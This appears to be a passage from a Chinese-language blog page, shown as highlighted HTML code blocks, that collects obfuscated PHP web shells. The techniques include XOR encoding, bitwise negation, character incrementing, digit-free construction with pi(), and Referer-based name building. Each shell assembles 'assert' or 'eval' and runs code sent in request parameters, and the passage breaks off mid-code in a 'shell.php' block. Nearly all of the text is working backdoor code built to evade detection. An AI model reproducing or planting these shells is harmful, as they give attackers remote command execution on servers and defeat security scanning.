class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];&#125;</span><br><span class="line">@preg_replace(<span class="string">&quot;/test/e&quot;</span>, fun(), <span class="string">&quot;testtesttest&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;_GET&#x27;</span>;</span><br><span class="line">(<span class="variable">$a</span>[<span class="number">0</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">1</span>].<span class="variable">$a</span>[<span class="number">2</span>].<span class="variable">$a</span>[<span class="number">3</span>].<span class="variable">$a</span>[<span class="number">4</span>])(<span class="variable">$$b</span>[<span class="string">&#x27;Du1&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = substr_replace(<span class="string">&quot;assexx&quot;</span>,<span class="string">&quot;rt&quot;</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable">$b</span>=[<span class="string">&#x27;&#x27;</span>=&gt;<span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>])];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);<span class="variable">$___</span> = <span class="variable">$$__</span>;@<span class="keyword">eval</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h5 id="异或转码数据"><a href="#异或转码数据" class="headerlink" title="异或转码数据"></a>异或转码数据</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = (<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = (<span class="string">&#x27;!&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&quot;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;#&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&amp;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;)&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;*&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;+&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;,&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;-&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;0&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;2&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;3&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;5&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;6&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;7&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;8&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;9&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;:&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span> =(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="随机异或"><a href="#随机异或" class="headerlink" title="随机异或"></a>随机异或</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VONE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">HALB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$rlf</span> = <span class="string">&#x27;B&#x27;</span> ^ <span class="string">&quot;\x23&quot;</span>;</span><br><span class="line">        <span class="variable">$fzq</span> = <span class="string">&#x27;D&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$fgu</span> = <span class="string">&#x27;h&#x27;</span> ^ <span class="string">&quot;\x1b&quot;</span>;</span><br><span class="line">        <span class="variable">$sbe</span> = <span class="string">&#x27;R&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$gba</span> = <span class="string">&#x27;H&#x27;</span> ^ <span class="string">&quot;\x3a&quot;</span>;</span><br><span class="line">        <span class="variable">$oya</span> = <span class="string">&#x27;Y&#x27;</span> ^ <span class="string">&quot;\x2d&quot;</span>;</span><br><span class="line">        <span class="variable">$MWUC</span> = <span class="variable">$rlf</span> . <span class="variable">$fzq</span> . <span class="variable">$fgu</span> . <span class="variable">$sbe</span> . <span class="variable">$gba</span> . <span class="variable">$oya</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$MWUC</span>;&#125;<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$RNUJ</span> = <span class="keyword">$this</span>-&gt;HALB();</span><br><span class="line">        @<span class="variable">$RNUJ</span>(<span class="keyword">$this</span>-&gt;HY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$vone</span> = <span class="keyword">new</span> VONE();</span><br><span class="line">@<span class="variable">$vone</span>-&gt;HY = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;duitu&#x27;</span>]) ? base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]) : <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*$_=[];</span></span><br><span class="line"><span class="comment">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="comment">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span></span><br><span class="line"><span class="comment">$___=$_; // A</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++; // E </span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$____=&#x27;_&#x27;;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$_=$$____;</span></span><br><span class="line"><span class="comment">$___($_[_]); // ASSERT($_POST[_]);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// V </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$___</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// L </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$___</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xg&#x27;</span>]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="无数字"><a href="#无数字" class="headerlink" title="无数字"></a>无数字</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=chr(floor(pow(pi(),ceil(pi())))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi())+ceil(pi())+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.chr( floor(pow(ceil(pi()),pi())-ceil(pi()+<span class="literal">true</span>+<span class="literal">true</span>))).chr(floor(pow(ceil(pi()),pi())-ceil(pi()+pi())-<span class="literal">true</span>)).chr(floor(pow(ceil(pi()),pi())+pow(pi()-<span class="literal">true</span>,pi()-<span class="literal">true</span>)+<span class="literal">true</span>+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQ"><a href="#QQQ" class="headerlink" title="QQQ"></a>QQQ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.3.0, PHP 7)</span></span><br><span class="line"><span class="comment"> * Referer: https://www.duitutu.cn/assnmsl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;duitutu.cn&quot;</span>;</span><br><span class="line"><span class="variable">$bypass</span> = substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>],-<span class="number">7</span>,-<span class="number">4</span>);</span><br><span class="line">forward_static_call_array(<span class="variable">$bypass</span>.<span class="string">&quot;ert&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQQQ"><a href="#QQQQQ" class="headerlink" title="QQQQQ"></a>QQQQQ</h4><p><code>shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line"><span class="variable">$shell</span> =</span><br><span class="line"><span 